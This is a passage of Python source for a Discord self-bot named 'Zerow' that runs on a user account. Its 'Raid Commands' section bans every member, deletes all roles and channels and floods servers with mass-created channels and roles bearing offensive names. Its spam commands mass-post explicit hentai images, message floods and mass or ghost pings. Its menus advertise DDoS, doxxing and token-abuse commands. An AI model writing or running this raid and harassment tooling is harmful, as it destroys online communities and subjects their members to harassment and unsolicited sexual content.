        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

@zerow.command(aliases=["usdtobtc", "usd2btc"])
async def usdbtc(ctx, message):
    """Converts USD to BTC

    Parameters
       • USD - Amount of USD you want in BTC (NOTE: NEEDS TO BE WHOLE NUMBER)
     """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD"
    )

    r = r.json()
    usd = r["USD"]
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} BTC**")
    em.set_author(
        name="USD to Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)


@zerow.command(aliases=["eurtobtc", "eur2btc"])
async def eurbtc(ctx, message):
    """Converts EUR to BTC

    Parameters
       • EUR - Amount of USD you want in BTC (NOTE: NEEDS TO BE WHOLE NUMBER)
     """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=EUR"
    )

    r = r.json()
    eur = r["EUR"]
    index = 1 / eur
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}€** = **{converted} BTC**")
    em.set_author(
        name="EUR to Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)

@zerow.command(aliases=["usdtoeth", "usd2eth"])
async def usdeth(ctx, message):
    """Converts USD to ETH

    Parameters
    • USD - Amount of USD you want in ETH (NOTE: NEEDS TO BE WHOLE NUMBER)
    """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD"
    )

    r = r.json()
    usd = r["USD"]
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} ETH**")
    em.set_author(
        name="USD to ETH",
        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

@zerow.command(aliases=["eurtoeth", "eur2eth"])
async def eureth(ctx, message):
    """Converts EUR to ETH

    Parameters
    • USD - Amount of USD you want in ETH (NOTE: NEEDS TO BE WHOLE NUMBER)
    """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=EUR"
    )

    r = r.json()
    eur = r["EUR"]
    index = 1 / eur
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}£** = **{converted} ETH**")
    em.set_author(
        name="EUR to ETH",
        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

#=================================| Raid Commands |=================================#

@zerow.command()
async def banAll(ctx):
    """Bans all members in the guild the command is used"""
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.ban()
        except Exception as e:
            print(
                f"{Fore.RED}[-]banAll => {Fore.RESET}Failed to ban {member}\n{e}\n"
            )

@zerow.command(name='group-leaver',
                aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def _group_leaver(ctx):
    await ctx.message.delete()
    for channel in zerow.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@zerow.command()
async def rolecreate(ctx):
    await ctx.message.delete()
    for i in range(1, 25):
        try:
            await ctx.guild.create_role(name=f"🉐 RAPED BY ZEROW.🉐", color=RandomColor())
        except:
            print(f"{Fore.RED}[+]ROLE => {Fore.RESET}Failed to create role: {role}")

@zerow.command()
async def channelcreate(ctx):
    """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""
    await ctx.message.delete()
    for i in range(1, 1000):
        try:
            await ctx.guild.create_text_channel(
                name=f"🉐NUKED-BY-ZEROW.🉐-{i}"
            )
            await ctx.guild.create_voice_channel(
                name=f"🉐NUKED BY ZEROW.🉐 {i}"
            )
            await ctx.guild.create_category(
                name=f"🉐NUKED BY ZEROW.🉐 {i}"
            )
        except:
            print(f"{Fore.RED}[+]CHANNEL => {Fore.RESET}Failed to create: {channel}")

@zerow.command()
async def channeldelete(ctx):
    """Deletes any and every channel it can delete"""
    await ctx.send("🉐Deleting all channels...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {channel}")

@zerow.command()
async def roledelete(ctx):
    """Deletes every role except roles above you or bot specific roles like dyno"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete: {role}")


@zerow.command()
async def fulldelete(ctx):
    """Deletes every role except roles above you and deletes every channel"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(
                    f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {role}"
                )
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete: {channel}")



@zerow.command()
async def fullnuke(ctx):
    """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates Zerow. roles\nThen it deletes all channels possible to then make Zerow. channels"""
    await ctx.message.delete()
    roles = ctx.guild.roles
    roles.pop(0)
    for role in roles:
        if ctx.guild.roles[-1] > role:
            try:
                await role.delete()
            except:
                print(
                    f"{Fore.RED}[-]ROLE => {Fore.RESET}Failed to delete role: {role}"
                )

    for i in range(1, 50):
        try:
            await ctx.guild.create_role(
            await ctx.guild.create_role(name=f"🉐RAPED BY Zerow.🉐 {i}", color=RandomColor())
            )
        except Exception as e:
            print(f"Error while makign role.\n\nError: {e}")
        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT


    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.RED}[-]CHANNEL => {Fore.RESET}Failed to delete {channel}")

            print(
    )
        
    for member in ctx.guild.members:
        try:
            await member.ban()
            await ctx.message.delete()
        except:
            print(f"{Fore.RED}[-]BANNING => {Fore.RESET}Failed to ban {member}")

    for i in range(1, 100):
        try:
            await ctx.guild.create_text_channel(
                 name=f"NUKED-BY-ZEROW-{i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🉐Made text channel! NUKED-BY-ZEROW🉐-{i}"
            )
            await ctx.guild.create_voice_channel(
                name=f"NUKED BY ZEROW {i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🉐Made voice channel! NUKED BY ZEROW🉐 {i} "
            )
            await ctx.guild.create_category(
                name=f"NUKED BY ZEROW {i}"
            )
            print(
                f"{Fore.RED}[-]CHANNEL => {Fore.RESET}🉐Made category! NUKED BY ZEROW🉐 {i} "
            )
        except Exception as e:
            print(f"Error while making channels\nError: {e}")



#=================================| Spam zerow |=================================#




@zerow.command()
async def memespam(ctx):
    for b in range(50):
        r = requests.get("https://some-random-api.ml/meme").json()
        embed = discord.Embed(color=RandomColor())
        embed.set_author(name="You are gettign bombed with memes by 🉐Zerow.", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png") 
        embed.set_image(url=str(r["image"]))
        await ctx.message.delete()
        await ctx.send(embed=embed)



@zerow.command()
async def hentaispam(ctx):
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])

    r2 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r2.json()
    embed2 = discord.Embed(color=RandomColor())
    embed2.set_image(url=res["url"])

    r3 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r3.json()
    embed3 = discord.Embed(color=RandomColor())
    embed3.set_image(url=res["url"])

    r4 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r4.json()
    embed4 = discord.Embed(color=RandomColor())
    embed4.set_image(url=res["url"])

    r5 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r5.json()
    embed5 = discord.Embed(color=RandomColor())
    embed5.set_image(url=res["url"])

    r6 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r6.json()
    embed6 = discord.Embed(color=RandomColor())
    embed6.set_image(url=res["url"])

    r7 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r7.json()
    embed7 = discord.Embed(color=RandomColor())
    embed7.set_image(url=res["url"])

    r8 = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r8.json()
    embed8 = discord.Embed(color=RandomColor())
    embed8.set_image(url=res["url"])

    r1 = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r1.json()
    embed1 = discord.Embed(color=RandomColor())
    embed1.set_image(url=res["url"])


    for i in range(30):
        await ctx.send(embed=embed)
        await ctx.send(embed=embed1)
        await ctx.send(embed=embed2)
        await ctx.send(embed=embed3)
        await ctx.send(embed=embed4)
        await ctx.send(embed=embed5)
        await ctx.send(embed=embed6)
        await ctx.send(embed=embed7)
        await ctx.send(embed=embed8)


@zerow.command()
async def blankspam(ctx):
    await ctx.message.delete()
    for i in range(10):
        await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")



@zerow.command()
async def numberspam(ctx):
    await ctx.message.delete()
    for i in range(50):
        await ctx.send("10101"* 400)

@zerow.command()
async def emojispam(ctx):
    for i in range(10):
        await ctx.send("🤡"* 1500)


@zerow.command()
async def crashspam(ctx):
    for i in range(30):
        await ctx.send("🤡🧊"* 100)
        

@zerow.command()
async def embedspam(ctx):
    await ctx.message.delete()
    for i in range(50):
        embed = discord.Embed(color=RandomColor())
        embed.set_author(name="🧊So yea you are getting spammed by Zerow., do you like it?🧊") 
        await ctx.send(embed=embed)

@zerow.command()
async def pinguser(ctx, message):
    await ctx.message.delete()
    for i in range(10):
        var = ("<@" + message + ">")
        await ctx.send(var*70)


@zerow.command()
async def silentping(ctx, message):
    await ctx.message.delete()
    for i in range(10):
        var = ("<@" + message + ">")
        await ctx.send(var*70)
        await ctx.send(var*70)
        await ctx.send(var*70)
        async for message in ctx.message.channel.history(limit=3).filter(lambda m: m.author == zerow.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

@zerow.command(aliases=["gp"])
async def ghostping(ctx, message):
    await ctx.message.delete()
    for i in range(1):
        var = ("<@" + message + ">")
        await ctx.send(var*70)
        async for message in ctx.message.channel.history(limit=1).filter(lambda m: m.author == zerow.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass

#???????????????????????????????????????commands???????????????????????????????????????

@zerow.command()
async def serverbuilder(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Zerow. Server Builder") 
    embed.add_field(name = "| buildtemplate1 |", value="Tutorial 2")
    embed.add_field(name = "| buildtemplate2 |", value="Waz")
    embed.add_field(name = "| buildtemplate3 |", value="Sun Flower")
    embed.add_field(name = "| buildtemplate4 |", value="Gamer Zone")
    embed.add_field(name = "| buildtemplate5 |", value="Baddies")
    embed.add_field(name = "| buildtemplate6 |", value="Issa")
    embed.add_field(name = "| buildtemplate7 |", value="Drug Cartel")
    embed.add_field(name = "| buildtemplate8 |", value="Everything Anime")
    embed.add_field(name = "| How to create | ", value="Prefix + buildtemplate(number) to create the server")
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def hentaiporn(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="hentai, pussy, tits, waifu, fox, hentaigif, pussygif, cumgif, kunigif") 
    embed.add_field(name = "|🉐 Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def ddos(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="pinger, booter, weakdns, whitepages, geo") 
    embed.add_field(name = "|🉐 Credits |", value="Made by InsainBoy and THC4L")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def hacking(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="login, logout, dox, tokeninfo, tokenfuck") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def helpful(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="purge, guildicon, guildinfo, whois, av, copy, uptime, ping, clear") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def extra(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="spoiler, streaming, playing, listening, watching, tinyurl, btc, eth, usdbtc, eurbtc, usdetc, euretc") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def spam(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="blankspam, numberspam, emojispam, crashspam, embedspam, memespam, hentaispam, silentping, pinguser") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def raid(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="fullnuke, fulldelete, banall, rolecreate, channelcreate, channeldelete, roledelete, group-leaver") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)

@zerow.command()
async def fun(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="8ball, slot, rainbowrole, ascii, cum, slap, hug, kiss, cat, dog, panda, meme, blank, nitro") 
    embed.add_field(name = "|🉐 Credits |", value="Made by </KatΣxoD>")
    embed.add_field(name = "|🉐 Website |", value="||https://katexod.github.io/zerow.selfbot/index.html||")
    await ctx.send(embed=embed)




#=================================| Helpful Commands |=================================#

@zerow.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == zerow.user).map(lambda m: m):
        try:
            await message.delete()
        except:
            pass

@zerow.command(aliases=["guildinfo"])
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                          timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
    await ctx.send(embed=embed)


@zerow.command()
async def ping(ctx):
    await ctx.message.delete()
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")

@zerow.command()
async def guildicon(ctx):
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon_url)   
    embed.set_image(url=ctx.guild.icon_url)
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def av(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author 
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name=str(user), icon_url=user.avatar_url)     
    embed.set_image(url=user.avatar_url)
    await ctx.message.delete()
    await ctx.send(embed=embed)

@zerow.command()
async def copy(ctx):
    await ctx.message.delete()
    await zerow.create_guild(f"{ctx.guild.name} Copy")
    await asyncio.sleep(4)
    for g in zerow.guilds:
        if f"{ctx.guild.name} Copy" in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")

@zerow.command()
async def clear(ctx):
    await ctx.message.delete()
    os.system("cls")
    ready() 



zerow.run(TOKEN, bot=False, reconnect=True)
